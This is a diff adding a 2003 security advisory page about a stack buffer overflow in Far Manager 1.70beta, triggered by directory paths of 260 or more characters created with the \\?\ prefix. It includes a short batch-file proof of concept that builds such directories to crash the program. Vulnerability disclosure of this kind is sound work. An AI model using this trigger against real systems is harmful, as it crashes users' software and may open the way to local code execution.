@@ -1,0 +1,65 @@
+#define Title "Advisories : Buffer overflow in Far Manager"
+#include "../include/intro.html"
+<pre><font class="fixed">
+
+Title:                  Buffer overflow in Far Manager
+Author:                 ZARAZA &lt;3APA3A@SECURITY.NNOV.RU&gt;
+Affected:               Far Manager 1.70beta1 and prior
+                        (saved EIP overflow)
+                        1.70beta4
+                        (off-by-one frame pointer overflow)
+Vendor:                 RARSoft
+Risk:                   Average (local code execution)
+Exploitable:            Yes
+Remote:                 No
+Vendor Notified:        January, 30 2003
+
+I. Introduction:
+
+FAR is most convinient console file manager developed by Eugene Roshal
+
+II. Vulnerability.
+
+Stack based overflow occurs on paths &gt;= 260 characters.
+
+III. Details.
+
+NTFS  file system allows to create paths of almost unlimited length. But
+Windows  API  does  not  allow  path  longer  than 256 bytes. To prevent
+Windows  API  from  checking  requested  path \\?\ prefix may be used to
+filename.  This  is documented feature of Windows API. Paths longer than
+260  characters  will  cause  FAR to crash. Far 1.70beta4 implements the
+check  of  path  length and does not allows to use paths longer than 160
+characters.  But due to bug in coding it's still possible to exploit FAR
+by  using  path  of  exactly  260  characters  (off-by-one stack pointer
+overflow).
+
+IV. Exploit
+
+This  .bat  file demonstrates vulnerability (it creates directory with 2
+subdirectories,  first one will cause Far 1.70beta1 to crash, second one
+will cause Far 1.70beta4 to crash.
+
+@echo off
+SET A=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+SET B=BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+mkdir \\?\c:\%A%
+mkdir \\?\c:\%A%\%A%
+mkdir \\?\c:\%A%\%B%\
+
+V. Vendor
+
+Will be patched in 1.70beta5 than released.
+
+-- 
+http://www.security.nnov.ru
+         /\_/\
+        { , . }     |\
++--oQQo->{ ^ }<-----+ \
+|  ZARAZA  U  3APA3A   }
++-------------o66o--+ /
+                    |/
+You know my name - look up my number (The Beatles)
+</pre></font>
+
+#include "../include/postpage.html"
